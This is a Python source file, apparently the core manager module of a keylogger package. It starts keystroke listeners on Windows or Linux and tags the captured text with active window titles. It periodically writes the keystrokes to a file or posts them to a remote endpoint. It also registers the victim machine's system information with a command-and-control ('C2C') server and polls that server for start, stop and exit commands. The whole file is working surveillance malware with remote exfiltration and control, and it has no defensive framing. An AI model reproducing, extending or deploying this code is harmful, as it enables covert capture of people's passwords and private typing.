import logging
import os
import threading
import time
import requests
from typing import Protocol, Optional

from keylogger.file_writer import FileWriter
from keylogger.network_writer import NetworkWriter
from keylogger.sinker import Sinker
from keylogger.processor import Processor
from keylogger.listner import LinuxKeylogger, WindowsKeylogger, Listener
from keylogger.system_info import get_system_info
from keylogger.active_window import WindowTracker

logger = logging.getLogger(__name__)


class Manager(Protocol):
    """
    Manager is a protocol that defines the interface for managing the keylogger.
    """

    sink: Sinker
    processor: Processor
    listner: Listener

    def start(self) -> None:
        """
        start the manager.
        """
        ...

    def stop(self) -> None:
        """
        stop the manager.
        """
        ...


class DefaultManager:
    """
    DefaultManager is a class that implements the Manager protocol.

    every 10 seconds, it gets the data from the listener, processes it using the processor,
    and then sinks the processed data using the sink.
    """

    def __init__(
        self,
        endpoint: Optional[str] = None,
        log_path: Optional[str] = None,
        push_interval: int = 10,
    ):
        self.endpoint = endpoint
        self.log_path = log_path
        self.interval = push_interval
        self.processor = Processor("")
        self.machine_id = self.processor.mac

        # Create the sinks
        self.sinks = []
        if log_path:
            self.sinks.append(FileWriter(log_path))
        if self.endpoint:
            self.sinks.append(NetworkWriter(self.endpoint + "/data"))

    def _setup(self):
        # Use WindowsKeylogger if the OS is Windows, otherwise use LinuxKeylogger
        if os.name == "vnt":
            klogger: Listener = WindowsKeylogger()
            self.window_tracker = None
        else:
            klogger: Listener = LinuxKeylogger()
            # Start a new sequence when the active window changes
            try:
                self.window_tracker = WindowTracker(
                    # use lambda to call the start_new_sequence method with the window title
                    lambda w: klogger.start_new_sequence(w.title)
                )
            except Exception:
                logger.error("Failed to create the WindowTracker", exc_info=False)
                self.window_tracker = None

        self.listner = klogger

        # Create a thread to run the loop
        self._loop_thread = threading.Thread(target=self._loop)
        self._stopped = False

    def start(self) -> None:
        logger.debug("Starting the manager")
        self._setup()
        self.listner.start()
        if self.window_tracker:
            self.window_tracker.start()
        self._loop_thread.start()
        self._stopped = False
        self._c2c_init()

    def stop(self) -> None:
        logger.debug("Stopping the manager")
        self._stopped = True

        self.listner.stop()
        if self.window_tracker:
            self.window_tracker.stop()

        if self._loop_thread and self._loop_thread.is_alive():
            self._loop_thread.join()

    def run(self) -> None:
        """
        Run the manager

        This function will start the manager, and then long-poll the C2C server
        for control commands.
        """
        last = None

        while ctrl := self._c2c_ctrl(last=last):
            logger.debug(f"Received control command: {ctrl}")

            if last == ctrl:
                continue

            last = ctrl

            if ctrl == "exit":
                break
            if ctrl == "stop":
                self.stop()
            if ctrl == "start":
                self.start()

        if not self._stopped:
            print("Exiting... press Ctrl+C again to exit immediately")
            self.stop()

    def _loop(self):
        elpased = 0

        # Run the loop until the manager is stopped
        while not self._stopped:
            # If the interval has passed, get the data from the listener,
            # process it, and then sink it.
            if elpased >= self.interval:
                data = self.listner.get_data()
                for d in data:
                    if not d.data:
                        continue

                    processed_data = self.processor.process_data(d)
                    for sink in self.sinks:
                        # Sink the processed data to all the sinks
                        sink.sink(processed_data)
                elpased = 0

            time.sleep(1)
            elpased += 1

    def _c2c_init(self):
        # Initialize the connection to the C2C server
        if not self.endpoint:
            return False

        system_info = get_system_info()
        machine_info = {
            "name": system_info.get("pc_name", "Unknown"),
            "machine_id": self.machine_id,
            "info": system_info,
        }

        resp = requests.post(
            f"{self.endpoint}/machine",
            json=machine_info,
        )
        logger.info(f"Connected to the C2C server: {self.endpoint}")
        # Check for non-2xx status codes
        if resp.status_code < 200 or resp.status_code >= 300:
            logger.error(
                f"Failed to send machine info to the C2C server: {self.endpoint}"
            )
            return False
        return True

    def _c2c_ctrl(self, last=None):
        """
        Ctrl is a long-polling request to the C2C server to get the control command.
        """

        if not self.endpoint:
            if last:
                try:
                    time.sleep(10)
                    return last
                except KeyboardInterrupt:
                    return "exit"

            return "start"

        try:
            resp = requests.get(
                f"{self.endpoint}/ctrl",
                params={"last": last, "machine_id": self.machine_id},
            )
        except requests.exceptions.ConnectionError as e:
            logger.error(f"Failed to connect to the C2C server: {self.endpoint}", e)
            return
        except requests.exceptions.RequestException as e:
            logger.error(
                f"Failed to get the control command from the C2C server: {self.endpoint}",
                e,
            )
            return
        except KeyboardInterrupt:
            return "exit"
        except Exception as e:
            logger.error(
                f"Failed to get the control command from the C2C server: {self.endpoint}",
                e,
            )
            return

        if resp.status_code != 200:
            logger.error(
                f"Failed to get the control command from the C2C server: {self.endpoint}",
                resp.json(),
            )
            return "exit"

        logger.debug(f"Received control command: {resp.json().get('ctrl', '')}")

        return resp.json().get("ctrl", "")
